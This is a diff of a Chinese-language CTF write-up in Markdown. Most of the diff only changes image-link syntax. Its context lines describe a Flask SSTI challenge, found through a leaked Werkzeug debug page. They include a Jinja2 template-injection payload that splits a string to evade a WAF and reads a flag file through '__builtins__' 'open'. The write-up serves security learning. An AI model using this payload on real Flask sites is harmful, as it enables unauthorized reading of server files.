@@ -1,22 +1,22 @@
-![[Pasted image 20221221165258.png|500]]
+![](<./img/Pasted image 20221221165258.png>)
 
 ---
 首页长这样
 
-![[Pasted image 20221221165318.png|700]]
+![](<./img/Pasted image 20221221165318.png>)
 
 
 ```
 /decode
 ```
 
-![[Pasted image 20221221165420.png|700]]
+![](<./img/Pasted image 20221221165420.png>)
 
 ```
 /hint
 ```
 
-![[Pasted image 20221221165508.png|300]]
+![](<./img/Pasted image 20221221165508.png>)
 
 ---
 先是扫目录，无果
@@ -27,15 +27,15 @@
 
 跳转到了`Werkzeug`的调试页面
 
-![[Pasted image 20221221165800.png]]
+![](<./img/Pasted image 20221221165800.png>)
 
 获取到了部分源码
 
 大体上是`flask`的`SSTI`
 
-![[Pasted image 20221221170818.png|300]]
+![](<./img/Pasted image 20221221170818.png>)
 
-![[Pasted image 20221221171012.png]]
+![](<./img/Pasted image 20221221171012.png>)
 
 ```python
 {{config}}
@@ -72,6 +72,6 @@ def waf(str):
 {{url_for.__globals__['__builtins__']['open']('/this_is_the_fl'+'ag.txt','r').read()}}
 ```
 
-![[Pasted image 20221221194819.png]]
+![](<./img/Pasted image 20221221194819.png>)
 
 #Web #python #flask #SSTI #function #代码审计 
